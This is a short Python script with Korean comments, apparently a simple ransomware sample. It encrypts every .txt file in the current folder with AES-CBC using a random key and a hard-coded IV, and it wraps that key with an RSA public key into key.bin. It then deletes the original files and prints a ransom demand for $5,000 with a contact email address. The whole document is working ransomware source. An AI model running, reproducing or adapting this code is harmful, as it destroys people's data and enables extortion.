import os

from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

#initial vector는 hard code
iv = b64decode('CEco1lPPgNWtKkV91FDJdA==')
#key는 16바이트를 랜덤으로 생성
key = get_random_bytes(16)

#현재 파이썬이 위치한 폴더 내에 있는 모든 파일 이름을 filename에 저장
for filename in os.listdir():
	#만약 filename의 확장자를 분리했을 때 txt 파일이라면 아래의 명령 실행
	if os.path.splitext(filename)[1] == '.txt':
		s = os.path.splitext(filename)[0]
		#각 파일을 AES CBC 모드로 암호화 진행
		with open(filename, "rb") as f:
			data = f.read()
			cipher = AES.new(key, AES.MODE_CBC, iv)
			ct_bytes = cipher.encrypt(pad(data, AES.block_size))
			#확장자명을 enc로 바꿔서 다시 저장하는 부분
			writeFile = open(s + '.enc', "wb")
			writeFile.write(ct_bytes)
			writeFile.close()
			#파일 암호화에 사용한 대칭키를 공개키를 이용하여 암호화, "key.bin에 저장"
			recipient_key = RSA.import_key(open("receiver.pem").read())
			file_out = open("key.bin", "wb")
			cipher_rsa = PKCS1_OAEP.new(recipient_key)
			enc_data = cipher_rsa.encrypt(key)
			file_out.write(enc_data)
			file_out.close()
			#기존의 txt 파일은 삭제
			os.remove(filename)
print("Your text files are encrypted. To decrypt them, you need to pay me $5,000 and send key.bin in your folder to csh16034@gmail.com.")

